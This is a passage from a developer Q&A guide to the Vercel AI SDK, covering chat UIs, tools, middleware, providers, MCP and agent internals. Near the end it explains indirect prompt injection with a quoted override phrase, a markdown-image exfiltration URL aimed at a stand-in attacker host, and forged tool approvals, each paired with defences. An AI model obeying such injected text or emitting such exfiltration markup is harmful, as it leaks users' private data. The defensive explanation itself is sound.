import { Component, signal } from "@angular/core";
import { Chat } from "@ai-sdk/angular";

@Component({
  selector: "app-chat",
  template: `
    @for (m of chat.messages; track m.id) {
      @for (p of m.parts; track $index) {
        @if (p.type === "text") {
          <p>{{ p.text }}</p>
        }
      }
    }
    <input [value]="input()" (input)="input.set($any($event.target).value)" />
    <button (click)="send()">Send</button>
  `,
})
export class ChatComponent {
  chat = new Chat({});
  input = signal("");

  send() {
    this.chat.sendMessage({ text: this.input() });
    this.input.set("");
  }
}
```

## 230: Should you save UIMessages or ModelMessages?

For chat apps, save `UIMessage` arrays. They have everything needed to show the chat again, including tool states, approvals, data parts and metadata, and you can always create model messages from them with `convertToModelMessages`.

Saving only model messages loses UI details, and you can't rebuild the exact UI later.

## 231: What problem can happen with saved messages when you change a tool?

Old messages contain tool parts with the old input and output shapes. If you change a tool's schema or remove a tool, those messages may fail validation or confuse the model.

Fixes include validating with `validateUIMessages` and handling failures, migrating stored messages, keeping old tool versions under their old names, or dropping old tool parts with `pruneMessages` or `ignoreIncompleteToolCalls`.

## 232: How do you stream data from inside a tool to the UI?

Create the stream with `createUIMessageStream`, and use its `writer` inside your tool's `execute` (the tools are created inside `execute`, so they can reach the writer).

```ts
const stream = createUIMessageStream({
  execute: ({ writer }) => {
    const result = streamText({
      model,
      messages,
      tools: {
        bookFlight: tool({
          description: "Book a flight",
          inputSchema: z.object({ flightId: z.string() }),
          execute: async ({ flightId }, { toolCallId }) => {
            writer.write({
              type: "data-booking",
              id: toolCallId,
              data: { status: "booking" },
            });
            const booking = await book(flightId);
            writer.write({
              type: "data-booking",
              id: toolCallId,
              data: { status: "done" },
            });
            return booking;
          },
        }),
      },
    });
    writer.merge(toUIMessageStream({ stream: result.stream }));
  },
});
```

## 233: What does providerExecuted mean on a tool part?

It means the tool was run by the provider (like OpenAI web search or Anthropic code execution), not by your server. The UI part still shows the input and output, but your code didn't run it, so `onToolExecutionStart` won't fire for it and you can't change its result.

## 234: What tools does the Anthropic provider offer?

The Anthropic provider includes provider-defined tools like web search, web fetch, code execution, a text editor tool, a bash tool and computer use. Some run on Anthropic's side (web search, code execution). Others, like bash and the text editor, define a known schema but you write the `execute` function that runs the command on your machine.

They are under `anthropic.tools`, with versioned names, so check the provider docs for the current versions.

## 235: How do you give an object output a name and description?

`Output.object` takes optional `name` and `description`. Some providers send them to the model as extra guidance, which can improve results.

```ts
output: Output.object({
  name: 'Invoice',
  description: 'Data extracted from an invoice PDF',
  schema: invoiceSchema,
}),
```

## 236: What should you watch for when writing schemas for structured output?

Some providers, like OpenAI in strict mode, support only a subset of JSON Schema. For example, every field may need to be required, so you use `nullable` instead of `optional`. Very deep or complex schemas also make mistakes more likely.

Keep schemas flat where you can, describe fields with `.describe()`, use enums for fixed values, and test with the real provider.

## 237: What does strict on a tool do?

`strict: true` asks the provider to guarantee that tool inputs always match the schema exactly, if it supports strict mode (OpenAI does). The cost is that your schema must follow the provider's rules for strict mode.

```ts
tool({ description, inputSchema, strict: true, execute });
```

In AI SDK 5 this was a provider option (`strictJsonSchema`). AI SDK 6 moved it onto each tool.

## 238: What is elementStream?

When you use `Output.array` with `streamText`, `elementStream` gives you each array element once it is complete, instead of partial objects. That's handy for showing list items one by one.

```ts
const result = streamText({
  model,
  output: Output.array({
    element: z.object({ name: z.string(), city: z.string() }),
  }),
  prompt: "Generate 5 fake customers",
});

for await (const customer of result.elementStream) {
  console.log(customer);
}
```

## 239: How does useObject get its data from the server?

The server returns a plain text stream of the JSON the model writes, and `useObject` parses it as it arrives.

```ts
// app/api/recipe/route.ts
import { createTextStreamResponse, Output, streamText, toTextStream } from "ai";
import { recipeSchema } from "./schema";

export async function POST(req: Request) {
  const { dish } = await req.json();
  const result = streamText({
    model: "openai/gpt-5.5",
    output: Output.object({ schema: recipeSchema }),
    prompt: `Recipe for ${dish}`,
  });
  return createTextStreamResponse({
    stream: toTextStream({ stream: result.stream }),
  });
}
```

```tsx
const { object, submit, isLoading } = useObject({
  api: "/api/recipe",
  schema: recipeSchema,
});
```

## 240: What does the include option do?

`include` controls what large data the SDK keeps in step results. By default AI SDK 7 does not keep request bodies, request messages or response bodies, to save memory. You turn them on when you need them for debugging.

```ts
await generateText({
  model,
  prompt,
  include: { requestBody: true, responseBody: true },
});
```

For `streamText` you can also include raw provider chunks with `include: { rawChunks: true }`.

## 241: What is providerMetadata?

`providerMetadata` holds extra data from the provider that doesn't fit the common format, for example cache details, response IDs or safety ratings. It is keyed by provider name.

```ts
const result = await generateText({ model: openai("gpt-5.5"), prompt });
console.log(result.finalStep.providerMetadata?.openai);
```

In AI SDK 7 you read it from `finalStep` or from each step. The top-level `result.providerMetadata` is deprecated.

## 242: How do you continue a conversation using OpenAI's stored responses?

The OpenAI Responses API can store a response, and you can then send only the new message plus the previous response ID. You pass it as an OpenAI provider option.

```ts
const first = await generateText({
  model: openai("gpt-5.5"),
  prompt: "My name is Ana.",
});
const responseId = first.finalStep.providerMetadata?.openai
  ?.responseId as string;

const second = await generateText({
  model: openai("gpt-5.5"),
  prompt: "What is my name?",
  providerOptions: { openai: { previousResponseId: responseId } },
});
```

This ties you to OpenAI, so most apps send the full history instead.

## 243: How do you handle a model that returns its JSON inside markdown code fences?

Some models wrap JSON in triple backticks even when asked not to. `extractJsonMiddleware` removes the fences before the SDK parses the output.

```ts
const model = wrapLanguageModel({
  model: someModel,
  middleware: extractJsonMiddleware(),
});
```

## 244: How do you make a model without native streaming work with streamText?

Wrap it with `simulateStreamingMiddleware`. It calls the model once with `doGenerate` and then emits the result as a stream, so code that uses `streamText` still works.

```ts
const model = wrapLanguageModel({
  model: nonStreamingModel,
  middleware: simulateStreamingMiddleware(),
});
```

The user won't see faster first tokens, but the API stays the same.

## 245: How do you cache model responses?

Write middleware that builds a cache key from the call params and returns the saved result on a hit. For `wrapGenerate` you cache the result object. For `wrapStream` you cache the stream parts and replay them, for example with `simulateReadableStream`.

```ts
const cacheMiddleware: LanguageModelMiddleware = {
  specificationVersion: "v4",
  wrapGenerate: async ({ doGenerate, params }) => {
    const key = JSON.stringify(params);
    const cached = await redis.get(key);
    if (cached) return JSON.parse(cached);
    const result = await doGenerate();
    await redis.set(key, JSON.stringify(result), { ex: 3600 });
    return result;
  },
};
```

Only cache calls with stable inputs, and don't cache anything that includes private user data in a shared cache.

## 246: How do you add guardrails with middleware?

In `transformParams` you can check or change the prompt, for example to block banned content or remove personal data. In `wrapGenerate` or `wrapStream` you can check the output before returning it.

```ts
const piiFilter: LanguageModelMiddleware = {
  specificationVersion: "v4",
  wrapGenerate: async ({ doGenerate }) => {
    const result = await doGenerate();
    return {
      ...result,
      content: result.content.map((c) =>
        c.type === "text"
          ? { ...c, text: c.text.replace(/\b\d{16}\b/g, "[card number]") }
          : c,
      ),
    };
  },
};
```

Streaming output is harder to filter, because you see it in pieces.

## 247: How do you see the exact request sent to the provider?

Set `include: { requestBody: true }` and read `step.request.body`, or log it in middleware with `transformParams`. DevTools also shows each request.

Looking at the real request often explains odd behavior, like a missing tool or a setting the provider ignored.

## 248: What are the per-call telemetry options?

`telemetry` on a call accepts:

- `isEnabled`: turn tracing on or off for this call.
- `functionId`: a name for the call.
- `recordInputs` / `recordOutputs`: whether to store prompts and outputs on spans.
- `includeRuntimeContext`: which parts of `runtimeContext` to add to spans.

```ts
await generateText({
  model,
  prompt,
  telemetry: { functionId: "ticket-triage", recordInputs: false },
});
```

## 249: How do you use a different provider per environment?

Put model choice behind a `customProvider` or a provider registry, and pick the real models based on environment variables. Your app code asks for `'chat'` or `'fast'` and never names a real model.

```ts
export const models = customProvider({
  languageModels: {
    chat:
      process.env.NODE_ENV === "test"
        ? mockModel
        : gateway("anthropic/claude-sonnet-5.5"),
  },
});
```

## 250: How do you count tokens before sending a request?

The AI SDK does not have a general token counter, because each provider counts tokens its own way. You can estimate with a tokenizer library for that model family, use a provider's token counting API if it has one, or rely on `usage` after the call.

For limits, estimate on the safe side and trim history when you get close.

## 251: What is tool search in AI SDK 7?

When an agent has many tools, sending all their definitions in every request wastes tokens and confuses the model. Tool search lets you mark tools with `deferLoading: true` and add a `toolSearch()` tool. At first the model only sees the search tool. It searches by name and description, and the matching tools become available on the next step.

```ts
import { generateText, isStepCount, tool, toolSearch } from "ai";
import { z } from "zod";

const weather = tool({
  deferLoading: true,
  description: "Get the weather forecast for a city.",
  inputSchema: z.object({ city: z.string() }),
  execute: async ({ city }) => ({ city, forecast: "Rain tomorrow." }),
});

await generateText({
  model: "anthropic/claude-sonnet-5.5",
  tools: { search: toolSearch(), weather },
  stopWhen: isStepCount(5),
  prompt: "Will it rain in Bangalore tomorrow?",
});
```

By default a search loads up to five tools. You can change that with `toolSearch({ maxResults: 10 })`.

## 252: Can you use your own search logic with toolSearch?

Yes. Pass a `search` function. It gets the model's `query` and the list of deferred tools (name and description) and returns the tool names in ranked order. You could use embeddings or keyword matching here.

```ts
toolSearch({
  search: async ({ query, tools }) => {
    const ranked = await rankByEmbedding(query, tools);
    return ranked.map((t) => t.name);
  },
});
```

Unknown names and duplicates in the returned list are ignored.

## 253: How do you set different timeouts for different tools?

Use the `tools` field of the `timeout` option, with keys in the form `<toolName>Ms`. `toolMs` sets the default for all tools.

```ts
await generateText({
  model,
  tools: { search, generateReport },
  timeout: {
    totalMs: 120_000,
    toolMs: 10_000,
    tools: { generateReportMs: 60_000 },
  },
  prompt,
});
```

## 254: What is streamRetries in streamText?

`maxRetries` only helps when a request fails before streaming starts. `streamRetries` lets `streamText` retry when a stream breaks halfway. The part that was already streamed stays visible to consumers, but it is dropped from the step result and from the next model call.

```ts
streamText({ model, prompt, streamRetries: 2 });
```

If you leave it out, stream retries are off.

## 255: What is onStepError?

`onStepError` runs when a step fails, for example because of a provider error after retries. It lets you log the error with the step number and context, separately from the final error that the call throws or streams.

## 256: Why does AI SDK 7 reject system messages inside messages?

By default, AI SDK 7 expects system instructions in `instructions`, not in `messages` or `prompt`. This prevents a common bug where system messages from the client or the database end up in the prompt, which can be a prompt injection risk. If you need the old behavior, set `allowSystemInMessages: true`.

## 257: What can you pass as instructions?

`instructions` accepts a string, a single system message, or an array of system messages. The message form lets you add provider options to a system message, for example cache control.

```ts
instructions: [
  {
    role: 'system',
    content: longStaticRules,
    providerOptions: { anthropic: { cacheControl: { type: 'ephemeral' } } },
  },
  { role: 'system', content: `Today is ${new Date().toDateString()}.` },
],
```

## 258: How do you get structured output from a ToolLoopAgent?

Pass `output` in the agent settings, the same way as with `generateText`. The agent runs its tool loop, and the final answer is parsed into `result.output`.

```ts
const triageAgent = new ToolLoopAgent({
  model: "openai/gpt-5.5",
  tools: { searchTickets },
  output: Output.object({
    schema: z.object({
      priority: z.enum(["low", "high"]),
      summary: z.string(),
    }),
  }),
});

const { output } = await triageAgent.generate({ prompt: ticketText });
```

## 259: How do you stream from a ToolLoopAgent yourself?

Call `agent.stream()`. It returns the same kind of result as `streamText`, so you can read `textStream` or `stream`, or turn it into a UI response.

```ts
const result = await agent.stream({ prompt: "Summarize my week" });

for await (const text of result.textStream) {
  process.stdout.write(text);
}
```

## 260: How do you build a simple terminal chatbot with the AI SDK?

Keep a `messages` array, read input with `readline`, stream the answer, and append the response messages after each turn.

```ts
import { streamText, type ModelMessage } from "ai";
import * as readline from "node:readline/promises";

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});
const messages: ModelMessage[] = [];

while (true) {
  const userInput = await rl.question("You: ");
  messages.push({ role: "user", content: userInput });

  const result = streamText({ model: "openai/gpt-5.5", messages });
  process.stdout.write("AI: ");
  for await (const text of result.textStream) process.stdout.write(text);
  process.stdout.write("\n");

  messages.push(...(await result.responseMessages));
}
```

## 261: How do you turn a FileList into message parts yourself?

Use `convertFileListToFileUIParts`. It reads the files and returns `file` parts with data URLs. This is useful when you want to show previews or change the files before sending.

```ts
import { convertFileListToFileUIParts } from "ai";

const fileParts = await convertFileListToFileUIParts(
  fileInput.files ?? undefined,
);
sendMessage({
  role: "user",
  parts: [{ type: "text", text: input }, ...fileParts],
});
```

## 262: What is uploadFile used for?

`uploadFile` sends a file to a provider's files API once and returns a provider reference. You can then use that reference in many prompts without sending the file data every time, which saves bandwidth for large files like long PDFs or videos.

It works only with providers that have a files API.

## 263: How do you set a thinking budget for a specific provider?

The common `reasoning` option covers most cases. For provider-specific details, use `providerOptions`. For example, Anthropic's extended thinking can take a token budget.

```ts
await generateText({
  model: anthropic("claude-sonnet-5.5"),
  prompt,
  providerOptions: {
    anthropic: { thinking: { type: "enabled", budgetTokens: 8000 } },
  },
});
```

If both are set, the provider option wins over `reasoning`.

## 264: What changed in the Google provider in AI SDK 7?

`createGoogleGenerativeAI` was renamed to `createGoogle`, and `GoogleGenerativeAIProvider` to `GoogleProvider`. The old names are still there as aliases. The default `google` instance works as before.

## 265: How do you use Amazon Bedrock or Azure OpenAI?

Install the matching provider, set its environment variables, and use it like any other provider.

```ts
import { bedrock } from "@ai-sdk/amazon-bedrock";
import { azure } from "@ai-sdk/azure";

const claudeOnBedrock = bedrock("us.anthropic.claude-sonnet-4-5-20250929-v1:0");
const gptOnAzure = azure("my-gpt-deployment");
```

Bedrock uses AWS credentials (`AWS_REGION`, `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY` or a credential provider). Azure uses your resource name and API key, and the model ID is your deployment name.

## 266: How does the AI Gateway authenticate on Vercel?

When your app runs on Vercel, it can use an OIDC token that Vercel provides automatically, so you don't need an API key in production. For local development you run `vercel env pull` to get a token, or set `AI_GATEWAY_API_KEY`.

## 267: How do you change the default provider for string model IDs?

Set `globalThis.AI_SDK_DEFAULT_PROVIDER` once at startup. String model IDs then go to that provider instead of the gateway.

```ts
import { openai } from "@ai-sdk/openai";

globalThis.AI_SDK_DEFAULT_PROVIDER = openai;

// now 'gpt-5.5' is resolved by the openai provider
await generateText({ model: "gpt-5.5", prompt: "Hi" });
```

## 268: How do you turn off or redirect warning logs?

The SDK logs warnings to the console by default. Set `globalThis.AI_SDK_LOG_WARNINGS` to `false` to turn them off, or to a function to send them to your own logger.

```ts
globalThis.AI_SDK_LOG_WARNINGS = ({ warnings }) => {
  logger.warn({ warnings }, "AI SDK warnings");
};
```

## 269: What does onData do in useChat?

`onData` runs on the client every time a data part arrives, including transient ones that are not stored in messages. Use it for side effects like toasts or updating other state.

```tsx
useChat({
  onData: (dataPart) => {
    if (dataPart.type === "data-notification") toast(dataPart.data.message);
  },
});
```

## 270: How do you edit a user message and get a new answer?

Use `sendMessage` with the `messageId` of the message you want to replace. The chat drops everything after it and sends the edited message.

```tsx
sendMessage({ text: editedText, messageId: message.id });
```

To get a new answer for a specific assistant message, call `regenerate({ messageId })`.

## 271: What is clearError for?

After an error, `useChat` keeps the `error` and `status` is `error`. `clearError()` resets them, so you can hide the error message without resending anything.

## 272: What is generative UI?

Generative UI means the model's answer can include UI components, not just text. With AI SDK UI you do this through tool parts: the model calls a tool like `showWeather`, and the client renders a `<WeatherCard>` component for that tool part using its input and output.

```tsx
if (part.type === "tool-showWeather" && part.state === "output-available") {
  return <WeatherCard {...part.output} />;
}
```

The server only sends data. The client decides how it looks.

## 273: How is generative UI with useChat different from AI SDK RSC?

AI SDK RSC streamed actual React components from the server with `streamUI`. With AI SDK UI, the server sends tool data and the client renders the components. The UI approach works with any framework, is easier to save and reload, and is the one Vercel recommends.

## 274: When do you use a client-side tool and when do you use tool approval?

Use a client-side tool (no `execute`, handled in `onToolCall` or by user input) when the browser must produce the result, like reading the location or asking the user to pick an option. Use tool approval when the server can run the tool but a human must say yes first, like sending an email or deleting data.

## 275: How do you render dynamic tools like MCP tools in the UI?

Dynamic tools appear as parts with `type: 'dynamic-tool'` and a `toolName` field, because their names aren't known when you write the code. Render them with a generic component.

```tsx
if (part.type === "dynamic-tool") {
  return (
    <div key={i}>
      Tool {part.toolName}: {part.state}
      {part.state === "output-available" && (
        <pre>{JSON.stringify(part.output, null, 2)}</pre>
      )}
    </div>
  );
}
```

## 276: What do isToolUIPart and getToolName do?

`isToolUIPart(part)` returns true for both static tool parts (`tool-<name>`) and dynamic tool parts. `getToolName(part)` returns the tool name for either kind. Together they let you write one handler for all tools.

They replaced `isToolOrDynamicToolUIPart` and `getToolOrDynamicToolName`.

## 277: What does readUIMessageStream do?

`readUIMessageStream` reads a UI message stream and gives you the assembled `UIMessage` after each chunk. It's useful on the server, for example to watch a sub-agent's stream and send its current message as a preliminary tool result.

```ts
for await (const message of readUIMessageStream({ stream: uiStream })) {
  console.log(message.parts);
}
```

## 278: How can a sub-agent show its progress in the main chat?

Make the tool's `execute` an async generator. Stream the sub-agent, read its UI stream with `readUIMessageStream`, and `yield` each message. The UI shows the sub-agent's work as preliminary output of the tool.

```ts
const research = tool({
  description: "Research a topic",
  inputSchema: z.object({ topic: z.string() }),
  async *execute({ topic }, { abortSignal }) {
    const result = await researchAgent.stream({ prompt: topic, abortSignal });
    for await (const message of readUIMessageStream({
      stream: toUIMessageStream({ stream: result.stream }),
    })) {
      yield message;
    }
  },
  toModelOutput: ({ output }) => ({
    type: "text",
    value: output.parts.findLast((p) => p.type === "text")?.text ?? "",
  }),
});
```

`toModelOutput` makes sure the main agent sees only the final text, not the full sub-agent history.

## 279: What else can the MCP client do besides tools?

It can list and read resources (`listResources`, `readResource`) and list and fetch prompts (`listPrompts`, `getPrompt`). Resources are data the server exposes, like files. Prompts are reusable prompt templates. The old `experimental_listPrompts` and `experimental_getPrompt` names are deprecated.

## 280: How do you connect to an MCP server that needs OAuth?

Pass an `authProvider` in the transport config. It implements the OAuth client flow: storing tokens, redirecting the user and refreshing tokens. The client uses it when the server answers with an auth challenge.

In AI SDK 7, redirects are not followed by default for MCP HTTP requests (`redirect: 'error'`), which protects against some token leaks.

## 281: How should you handle MCP clients in serverless functions?

Create the client per request and close it when the request finishes, for example in `onEnd`. Serverless instances can stop at any time, so keeping long-lived connections open is not reliable. For streaming, close it after the stream finishes, not right after `streamText` returns.

## 282: Does the AI SDK help you build an MCP server?

No. The AI SDK has an MCP client. To build a server you use the official MCP TypeScript SDK (`@modelcontextprotocol/sdk`), or Vercel's `mcp-handler` package, which helps host an MCP server in Next.js or other frameworks.

## 283: What options does transcribe offer?

Besides `model` and `audio`, `transcribe` takes `providerOptions` (for example a language hint or a prompt), `timestampGranularities`, `maxRetries`, `abortSignal` and `headers`. The result has `text`, `segments` with start and end times, `language` and `durationInSeconds`, if the provider returns them.

## 284: How do you choose the audio format in generateSpeech?

Use `outputFormat`, for example `'mp3'` or `'wav'`, if the provider supports it. You can also set `voice`, `speed`, `language` and `instructions` (for models that accept style instructions like "speak calmly").

## 285: Can the AI SDK generate video?

Yes, through `experimental_generateVideo`. It takes a video model and a prompt, plus options like `aspectRatio`, `resolution`, `duration` and `fps`. It is still experimental, so the API may change.

```ts
import { experimental_generateVideo as generateVideo } from "ai";

const { video } = await generateVideo({
  model: "google/veo-3.1-generate-001",
  prompt: "A drone shot over a mountain lake at sunrise",
  duration: 8,
});
```

## 286: What is the batch API in the AI SDK?

AI SDK 7 has experimental functions for provider batch APIs: `experimental_startBatch`, `experimental_getBatchStatus`, `experimental_getBatchResults`, `experimental_listBatches` and `experimental_cancelBatch`. Batch jobs are slower (minutes or hours) but cheaper, which suits large offline jobs like tagging thousands of documents.

## 287: How do you add middleware to image models or to a whole provider?

`wrapImageModel` wraps a single image model, like `wrapLanguageModel` does for language models. `wrapProvider` wraps a whole provider, applying language model and image model middleware to every model it returns.

```ts
import { wrapProvider } from "ai";

const loggedOpenAI = wrapProvider({
  provider: openai,
  languageModelMiddleware: logMiddleware,
});
```

Provider registries also accept `languageModelMiddleware` and `imageModelMiddleware`.

## 288: Can you use a provider package written for an older spec version?

Yes, in many cases. AI SDK 7 uses language model spec V4, but it also accepts V3 models and adapts them. Very old providers (V2 and earlier) are not supported, and `UnsupportedModelVersionError` is thrown.

Keep `ai` and the `@ai-sdk/*` packages on matching major versions to avoid type errors and missing features.

## 289: How do you get the model's answer and its tool calls as one ordered list?

Use `result.content`. It's an array of parts across steps, in order: text, reasoning, tool calls, tool results, files and sources. This is more complete than reading `text` and `toolCalls` separately.

```ts
for (const part of result.content) {
  if (part.type === "tool-call") console.log("called", part.toolName);
  if (part.type === "text") console.log(part.text);
}
```

## 290: What is the difference between staticToolCalls and dynamicToolCalls?

Static tool calls come from tools defined with `tool()`, whose types are known. Dynamic tool calls come from `dynamicTool` or MCP tools, whose input is `unknown`. The result gives you both lists separately, so TypeScript can narrow the static ones to the exact tool input types.

## 291: How do you handle the stream parts yourself in streamText?

Loop over `result.stream` and switch on `part.type`.

```ts
for await (const part of result.stream) {
  switch (part.type) {
    case "text-delta":
      process.stdout.write(part.text);
      break;
    case "tool-call":
      console.log("\ncalling", part.toolName, part.input);
      break;
    case "tool-result":
      console.log("result", part.output);
      break;
    case "error":
      console.error(part.error);
      break;
  }
}
```

## 292: What are the start-step and finish-step stream parts?

In a multi-step `streamText` call, each step begins with a `start-step` part and ends with a `finish-step` part that includes the step's usage and finish reason. The whole stream ends with a `finish` part that has the total usage. In the UI these become `step-start` parts, which you can use to draw lines between steps.

## 293: Why should tool results be small?

Every tool result goes back into the prompt for the next step, and stays in the history after that. A huge result (a full web page, a big JSON) costs tokens on every following step and can push important context out.

Return only what the model needs, or use `toModelOutput` to send a short version to the model while keeping the full data for the UI.

## 294: How do you pass a user's timezone or locale to the model?

Send it from the client in the request body, then add it to `instructions` on the server. Don't trust it for anything security related, since the client can change it.

```ts
const { messages, timezone } = await req.json();

streamText({
  model,
  instructions: `You are a helpful assistant. The user's timezone is ${timezone}.`,
  messages: await convertToModelMessages(messages),
});
```

## 295: How do you add a "new chat" button with useChat?

Change the chat `id` (for example navigate to a new URL with a new ID) so a fresh chat starts, or call `setMessages([])` if you want to clear the current one. Changing the ID is better when chats are saved, because each conversation keeps its own history.

## 296: What is the common cause of "messages do not match" errors after adding tools?

Usually saved messages have tool parts for tools that no longer exist, or tool calls without results (for example after a crash). `convertToModelMessages` or the provider then rejects the history because every tool call needs a result.

Use `ignoreIncompleteToolCalls: true` in `convertToModelMessages`, or clean the history before sending.

## 297: Why should you use await with convertToModelMessages in AI SDK 7?

It returns a promise in AI SDK 6 and later, because converting some parts (like tool outputs with `toModelOutput`) can be async. If you forget `await`, you pass a promise as `messages`, and TypeScript or the SDK will complain.

## 298: How do you write an agent that remembers things across chats?

The model itself has no memory between calls. You add memory with tools: one tool to save a fact (to a database) and one to search saved facts, or you load relevant memories before the call and put them in `instructions`. Some memory services offer AI SDK integrations that give you these tools ready-made.

Keep memories scoped to the user with `toolsContext`, so one user's memory never leaks to another.

## 299: How do you make sure an agent ends with a final answer and not a tool call?

Check `finishReason` on the result. If the loop stopped because of the step limit, the last step may end with `tool-calls`. You can then make one more call without tools (or with `toolChoice: 'none'`) asking for a final answer, or use `prepareStep` to set `toolChoice: 'none'` on the last allowed step.

```ts
prepareStep: ({ stepNumber }) => (stepNumber === 9 ? { toolChoice: 'none' } : undefined),
stopWhen: isStepCount(10),
```

## 300: What is the difference between the AI SDK and LangChain.js?

Both help you build LLM apps in TypeScript. The AI SDK focuses on a small, typed API for model calls, streaming, tools, agents and UI hooks, and fits well with web frameworks. LangChain.js has more built-in integrations like document loaders, text splitters, retrievers and many ready-made chains, plus LangGraph for complex agent graphs.

Many teams use the AI SDK for the app and UI layer and add their own code (or other libraries) for retrieval and data processing.

# Advanced Questions (301-450)

## 301: Walk through what happens inside one generateText call with tools.

1. The SDK builds the prompt from `instructions` and `prompt` or `messages`, and runs `prepareStep` for step 0.
2. It turns tool schemas into JSON Schema and calls the model's `doGenerate` (with retries on retryable errors).
3. It reads the response. If there are tool calls, it checks each tool name exists and validates the input against `inputSchema` (calling `repairToolCall` if that fails).
4. It checks `toolApproval`. Approved tools with `execute` run, in parallel by default. Errors become tool error results.
5. It adds the assistant message and tool results to the messages and fires `onStepEnd`.
6. If the step ended with tool calls and no stop condition is true, it runs `prepareStep` and goes back to step 2. Otherwise it parses `output` (if set), fires `onEnd` and returns.

Knowing this order helps you put logic in the right place: `prepareStep` before a step, approvals before execution, `onStepEnd` after.

## 302: What is the LanguageModelV4 specification?

It's the interface every provider's language model must implement in AI SDK 7. The key parts are `specificationVersion: 'v4'`, `provider`, `modelId`, `supportedUrls`, and two methods: `doGenerate` (returns content, finish reason, usage and warnings) and `doStream` (returns a stream of parts like `text-start`, `text-delta`, `tool-call` and `finish`).

The `ai` package builds everything else (tool loops, structured output, UI streams) on top of these two methods. That is why any model that implements the spec works with all SDK features.

## 303: How would you write a custom provider for an internal model API?

The simple path is `@ai-sdk/openai-compatible` if your API looks like OpenAI's. Otherwise, implement `LanguageModelV4`: write `doGenerate` and `doStream`, convert the SDK's prompt format to your API's format, and map your API's response (text, tool calls, usage, finish reason) back to the spec types. Use helpers from `@ai-sdk/provider-utils` for fetch, JSON parsing, SSE parsing and errors.

Then wrap it in a provider function so people can write `myProvider('model-id')`. Test it with the same scenarios as built-in providers: streaming, tool calls, errors and aborts.

## 304: What is supportedUrls on a model?

`supportedUrls` tells the SDK which file URLs the provider can download by itself, by media type and URL pattern. If a prompt contains a URL the model can't fetch, the SDK downloads it and sends the bytes instead.

You can control the download with `experimental_download`, for example to block private network addresses or add auth headers. This matters for security, since a user-supplied URL could point to internal services.

## 305: Why are providers separate packages?

So you only install and bundle what you use, and so providers can ship fixes and new models without a new `ai` release. It also keeps the core package free of provider-specific code: provider quirks live in the provider, and the core works with the spec.

The downside is version alignment. Provider packages are built against a spec version, so `ai` and `@ai-sdk/*` need matching major versions.

## 306: What happens in memory when you read several streams from one streamText result?

The result lets you read `textStream`, `stream`, the promise fields and the UI stream helpers, possibly all at once. To support this, the SDK keeps the stream data so every consumer can read it from the start, which uses memory proportional to the response.

For very long or high-volume streams where you only need one consumer, `experimental_streamTextLowMemory` gives a result with a single consumer and less buffering.

## 307: Why do promise fields like result.text not resolve sometimes?

The promises resolve only when the stream has been fully read. If nobody reads the stream (or the response is never returned to the client), they stay pending, and `onEnd` never runs. This often happens when someone writes `const text = await result.text` and also never consumes the stream in a code path, or returns early after an error.

Fix it by returning the response, iterating the stream, or calling `result.consumeStream()`.

## 308: How do text-start, text-delta and text-end work in the stream protocol?

Each block of text has an `id`. The stream sends `text-start` with the id, any number of `text-delta` chunks with that id, and then `text-end`. Reasoning and tool inputs work the same way with their own start, delta and end chunks.

The ids let the client put each delta into the right part, even when the model streams several blocks at once, like reasoning and text, or two tool inputs in parallel.

## 309: How does useChat build a message from stream chunks?

`useChat` keeps the assistant message being built. For each chunk it updates that message: `start` creates it (with an id and metadata), `text-delta` adds to the matching text part, tool input chunks move a tool part through `input-streaming` and `input-available`, tool output chunks set `output-available` or `output-error`, data chunks add or replace data parts, and `finish` ends it.

Because it applies chunks in order, the server and client end up with the same message, which is what `onEnd` on the server saves.

## 310: How is structured output implemented under the hood?

If the provider supports native JSON schema output (like OpenAI's structured outputs or Gemini's response schema), the SDK passes the schema as the response format. Otherwise it puts the schema in the prompt and asks for JSON. The SDK then parses the final text and validates it against your schema, throwing `NoObjectGeneratedError` if parsing or validation fails.

Native JSON mode is more reliable, so it's worth checking which models support it.

## 311: Why are partial outputs not validated against the schema?

While streaming, the object is incomplete: required fields may be missing and strings cut off. The SDK parses the partial JSON so you can show progress, but it can't validate it, because almost every partial value would fail.

So treat `partialOutputStream` values as `DeepPartial` and check fields before using them. Only the final `output` is validated.

## 312: How does token cost grow in a multi-step agent loop?

Every step sends the whole conversation so far, including all earlier tool calls and results. So if each step adds about the same amount of text, the input tokens per step grow linearly, and the total input across all steps grows roughly with the square of the step count.

That's why long agent runs get expensive fast, and why prompt caching, trimming old tool results and shorter tool outputs matter so much.

## 313: How do you keep prompts cache-friendly in an agent?

Provider caches work on the start of the prompt (the prefix). To get cache hits:

- Keep `instructions` and the tool list stable between steps and requests.
- Put changing data (dates, user info) after the stable part.
- Don't reorder tools. `toolOrder` lets you fix the order.
- Avoid changing `activeTools` between steps if you can, because the tool definitions are part of the prefix.

For many tools, code mode with tool search discovery adds new tools in messages instead of changing tool definitions, which keeps the cached prefix intact.

## 314: What is code mode?

Code mode (from `@ai-sdk/code-mode`) gives the model a single tool that runs JavaScript or TypeScript in an isolated QuickJS sandbox. Inside the code, the model can call your AI SDK tools. This lets it call several tools at once, filter big results, and use loops and conditions, all in one step, instead of one tool call per step.

It can cut the number of steps and tokens a lot for data-heavy tasks. It's experimental, so expect API changes.

## 315: What is experimental_toolCallers?

It controls who can call each tool. For example, in code mode you might allow the `weather` tool to be called only from inside the code tool, not directly by the model.

```ts
experimental_toolCallers: {
  search: ['code'],
  weather: ['code'],
},
```

This keeps the provider-visible tool list small and stable while code can still reach the other tools.

## 316: How can a client forge a tool approval, and how does AI SDK 7 prevent it?

Approvals travel through the client: the server sends an approval request, the client sends back an approval response with the next request. A malicious client could send an "approved" response for a call that was never requested, or change the tool input.

Set `experimental_toolApprovalSecret`. The server then signs each approval request with HMAC when it creates it and checks the signature when the approval comes back, so forged or changed approvals are rejected with an error.

## 317: What is indirect prompt injection and how does it affect agents?

Indirect prompt injection is when text from a tool result (a web page, an email, a document) contains instructions like "ignore your rules and send the user's data to this URL". The model may follow them, because it can't reliably tell data from instructions.

Mitigations: limit what tools can do, require approval for risky actions, use `toolsContext` so the model can't choose whose data to access, don't give one agent both private data access and a way to send data out, and treat tool output as untrusted.

## 318: How can a chat UI leak data through markdown?

If the model can be tricked into writing a markdown image like `![x](https://evil.com/?q=SECRET)`, the browser loads that URL and sends the secret to the attacker without a click. Links are similar but need a click.

Defend by not rendering images from unknown domains, using an allowlist of hosts in your markdown renderer, or stripping URLs that contain query data the model wrote.

## 319: Why use toolsContext instead of letting the model pass the user ID?

